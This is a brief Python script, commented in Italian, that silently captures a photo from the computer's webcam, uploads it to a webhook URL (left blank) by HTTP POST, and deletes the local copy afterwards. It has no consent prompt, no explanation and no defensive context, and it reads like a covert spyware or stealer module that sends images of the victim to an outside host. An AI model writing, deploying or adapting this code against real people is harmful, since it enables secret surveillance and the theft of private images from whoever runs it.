import os
import cv2
import requests
import tempfile

# Ottieni una directory temporanea appropriata per entrambi i sistemi operativi
temp_dir = tempfile.gettempdir()

# Determina il separatore di directory appropriato per il sistema operativo
file_separator = os.path.sep

# Ottieni la directory dell'utente corrente
user = os.path.expanduser("~")
hook = ""
camera_port = 0

# Creazione del percorso del file temporaneo compatibile con entrambi i sistemi
temp_file_path = os.path.join(temp_dir, "temp.png")

# Inizializza la fotocamera
camera = cv2.VideoCapture(camera_port)

# Cattura un'immagine dalla fotocamera
return_value, image = camera.read()

# Salva l'immagine nel percorso temporaneo
cv2.imwrite(temp_file_path, image)

# Rilascia la fotocamera
del(camera)

# Crea un dizionario per l'invio del file tramite richiesta POST
file = {"file": open(temp_file_path, "rb")}

# Invia il file al webhook
r = requests.post(hook, files=file)

# Verifica se il file temporaneo può essere rimosso
try:
    os.remove(temp_file_path)
except Exception as e:
    print("Errore durante la rimozione del file temporaneo:", e)
